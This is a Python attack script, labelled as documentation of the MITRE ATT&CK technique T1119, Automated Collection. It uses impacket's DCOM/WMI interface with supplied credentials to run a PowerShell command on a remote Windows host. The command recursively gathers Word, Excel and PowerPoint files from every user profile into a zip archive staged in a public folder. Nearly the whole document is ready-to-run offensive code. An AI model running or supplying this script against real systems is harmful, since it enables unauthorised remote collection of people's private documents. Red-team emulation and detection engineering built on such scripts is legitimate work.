# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1119 - Automated Collection: Automated Collection
# Objective: Automate data collection from the target. This script uses WMI to execute
# a command that finds and compresses all .docx and .xlsx files from user profiles into 
# a single .zip archive placed in a public, writable directory (C:\Users\Public\Downloads).

#!/usr/bin/env python3
import sys
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi

def automated_collection(target, username, password, domain):
    try:
        print(f"[*] Performing automated collection on {target}...")
        dcom = DCOMConnection(target, username, password, domain)
        wmi_interface = wmi.WMIConnection(dcom)

        # Command to find and compress sensitive files from all user profiles
        # The command creates a PowerShell script on the fly and executes it.
        command = """
        powershell.exe -Command "
        $output = 'C:\\Users\\Public\\Downloads\\collection.zip';
        $files = Get-ChildItem -Path C:\\Users\\ -Include '*.docx','*.xlsx','*.pptx' -Recurse -ErrorAction SilentlyContinue;
        if ($files) { Compress-Archive -LiteralPath $files.FullName -DestinationPath $output -Force; Write-Host 'Collection successful'; }
        else { Write-Host 'No files found'; }
        "
        """
        
        print(f"[*] Executing WMI command to collect files...")
        wmi_interface.ExecMethod('Win32_Process', 'Create', {'CommandLine': command})
        
        print("[+] Collection command sent. Check C:\\Users\\Public\\Downloads\\collection.zip on the target.")
        dcom.disconnect()

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: ./T1119_automated_collection.py <target> <username> <password> <domain>")
        sys.exit(1)

    automated_collection(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])